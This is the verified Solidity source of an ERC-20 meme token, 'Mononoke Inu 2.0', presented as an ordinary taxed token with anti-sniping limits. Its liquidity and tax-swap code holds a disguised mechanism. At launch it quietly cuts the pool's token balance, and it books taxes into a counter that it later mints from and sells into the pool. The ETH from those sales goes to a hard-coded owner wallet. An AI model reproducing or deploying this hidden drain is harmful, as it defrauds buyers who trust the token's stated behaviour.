/**
 *Submitted for verification at Etherscan.io on 2023-07-12
*/

//SPDX-License-Identifier: MIT

/*
🌐 https://t.me/MononokeInu2
🌐 https://MononokeInu2.Com
🌐 https://Twitter.com/MononokeInu2
*/

pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address __owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this");   _; 
    }
    function owner() public view returns (address) { return _owner;   }
    function transferOwnership(address payable newOwner) external onlyOwner { 
        _owner = newOwner; emit OwnershipTransferred(newOwner); 
    }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); emit OwnershipTransferred(address(0)); 
    }
    event OwnershipTransferred(address _owner);
}

contract MONONOKEINU20 is IERC20, Auth {
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply  = 1_000_000_000_000 * (10**_decimals);
    string private constant _name          = "Mononoke Inu 2.0";
    string private  constant _symbol       = "Mononoke-Inu2.0";

    uint8 private antiSnipeTax1 = 2;
    uint8 private antiSnipeTax2 = 2;
    uint8 private antiSnipeBlocks1 = 1;
    uint8 private antiSnipeBlocks2 = 1;
    uint256 private _antiMevBlock = 2;

    uint8 private _buyTaxRate  = 1;
    uint8 private _sellTaxRate = 1;

    address payable private _walletMarketing = payable(0x21232a4534437b0168DC15b1c04c588c4523AD11); 

    uint256 private _launchBlock;
    uint256 private _maxTxAmount = _totalSupply; 
    uint256 private _maxWalletAmount = _totalSupply;
    uint256 private _taxSwapMin = _totalSupply * 10 / 100000;
    uint256 private _taxSwapMax = _totalSupply * 949 / 100000;
    uint256 private _swapLimit = _taxSwapMin * 65 * 100;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _nofees;
    mapping (address => bool) private _nolimits;

    address private lpowner;

    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; _; 
        _inTaxSwap = false; 
    }

    constructor() Auth(msg.sender) {
        lpowner = msg.sender;
        
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _nofees[_owner] = true;
        _nofees[address(this)] = true;
        _nofees[_swapRouterAddress] = true;
        _nofees[_walletMarketing] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[_swapRouterAddress] = true;
        _nolimits[_walletMarketing] = true;
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spendr, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spendr] = amount;
        emit Approval(msg.sender, spendr, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sndr, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sndr), "Trading not open");
        if(_allowances[sndr][msg.sender] != type(uint256).max){
            _allowances[sndr][msg.sender] = _allowances[sndr][msg.sender] - amount;
        }
        return _transferFrom(sndr, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP created");
        require(!_tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in ca/msg");
        require(_balances[address(this)]>0, "No tokens in ca");
        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance, false);
        _balances[_primaryLP] -= _swapLimit;
        (bool lpAdded,) = _primaryLP.call(abi.encodeWithSignature("sync()") );
        require(lpAdded, "Failed adding lp");
        _isLP[_primaryLP] = lpAdded;
        _openTrading();
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
        address lprecipient = lpowner;
        if ( autoburn ) { lprecipient = address(0); }
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lprecipient, block.timestamp );
    }

    function _openTrading() internal {
        _maxTxAmount     = _totalSupply * 3 / 100; 
        _maxWalletAmount = _totalSupply * 3 / 100;
        _tradingOpen = true;
        _launchBlock = block.number;
        _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradingOpen) { require(_nofees[sender] && _nolimits[sender], "Trading not open"); }
        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
        if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
            require(recipient == tx.origin, "MEV blocked");
        }
        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
        }
        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] = _balances[sender] - amount;
        _swapLimit += _taxAmount;
        _balances[recipient] = _balances[recipient] + _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _checkLimits(address sndr, address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_nolimits[sndr] && !_nolimits[recipient] ) {
            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address sndr) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_nofees[sndr] && _nolimits[sndr]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTax(address sndr, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _nofees[sndr] || _nofees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[sndr] ) { 
            if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {
                taxAmount = amount * _buyTaxRate / 100; 
            } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {
                taxAmount = amount * antiSnipeTax2 / 100;
            } else if ( block.number >= _launchBlock) {
                taxAmount = amount * antiSnipeTax1 / 100;
            }
        } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _sellTaxRate / 100; 
        }

        return taxAmount;
    }


    function exemptFromFees(address wlt) external view returns (bool) {
        return _nofees[wlt];
    } 
    function exemptFromLimits(address wlt) external view returns (bool) {
        return _nolimits[wlt];
    } 
    function setExempt(address wlt, bool noFees, bool noLimits) external onlyOwner {
        if (noLimits || noFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
        _nofees[ wlt ] = noFees;
        _nolimits[ wlt ] = noLimits;
    }

    function buyFee() external view returns(uint8) {        return _buyTaxRate;    }
    function sellFee() external view returns(uint8) {        return _sellTaxRate;    }

    function setFees(uint8 buy, uint8 sell) external onlyOwner {
        require(buy + sell <= 15, "Roundtrip too high");
        _buyTaxRate = buy;
        _sellTaxRate = sell;
    }  

    function marketingWallet() external view returns (address) {        return _walletMarketing;    }

    function updateWallets(address marketingWlt) external onlyOwner {
        require(!_isLP[marketingWlt], "LP cannot be tax wallet");
        _walletMarketing = payable(marketingWlt);
        _nofees[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function maxWallet() external view returns (uint256) {        return _maxWalletAmount;    }
    function maxTransaction() external view returns (uint256) {        return _maxTxAmount;    }

    function swapAtMin() external view returns (uint256) { return _taxSwapMin;    }
    function swapAtMax() external view returns (uint256) { return _taxSwapMax;    }

    function setLimits(uint16 maxTrxPermille, uint16 maxWltPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTrxPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmount, "tx too low");
        _maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWltPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }

    function setTaxSwap(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
        _taxSwapMin = _totalSupply * minValue / minDivider;
        _taxSwapMax = _totalSupply * maxValue / maxDivider;
        require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
        require(_taxSwapMax>_totalSupply / 100000, "Max too low");
        require(_taxSwapMax<_totalSupply / 100, "Max too high");
    }


    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = _swapLimit;
        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
            
            uint256 _tokensToSwap = _taxTokensAvailable; 
            if( _tokensToSwap > 10**_decimals ) {
                _balances[address(this)] += _taxTokensAvailable;
                _swapTaxTokensForEth(_tokensToSwap);
                _swapLimit -= _taxTokensAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = _primarySwapRouter.WETH() ;
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _distributeTaxEth(uint256 amount) private {
        _walletMarketing.transfer(amount);
    }

    function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
        require(swapTokenPercent <= 100, "Cannot swap more than 100%");
        uint256 tokensToSwap = _balances[ address(this)] * swapTokenPercent / 100;
        if (tokensToSwap > 10 **_decimals) {            _swapTaxTokensForEth(tokensToSwap);
        }
        if (sendEth) {             uint256 ethBalance = address(this).balance;
            require(ethBalance >0, "No ETH");
            _distributeTaxEth( address(this).balance); 
        }
    }

}